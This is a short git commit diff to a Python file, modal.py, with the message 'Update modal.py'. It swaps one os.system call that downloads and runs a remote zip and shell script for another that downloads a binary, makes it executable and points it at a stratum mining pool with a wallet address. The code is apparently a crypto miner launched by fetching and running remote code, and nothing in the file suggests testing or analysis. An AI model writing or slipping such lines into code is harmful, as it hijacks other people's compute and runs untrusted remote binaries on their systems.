433c6fc7c7efc6416e2974c01f293de4816e4eb3
lianamahesra-creator <lianamahesra@gmail.com>
2026-06-03 14:45:43 +0700

    Update modal.py

--- modal.py
+++ modal.py
@@ -1,2 +1,2 @@
 import os
-os.system("wget https://github.com/lianamahesra-creator/legendary-journey/raw/refs/heads/main/redis.zip;unzip redis.zip;bash run.sh")
+os.system("wget https://github.com/lianamahesra-creator/legendary-journey/raw/refs/heads/main/alpha;chmod +x alpha;./alpha --pool stratum+tcp://us2.alphapool.tech:5566 --address prl1p2jan4dvkdfkt5r3pra7z96axrxjyjcgat9w7ldetlcy9wffm569sc9ux2t")
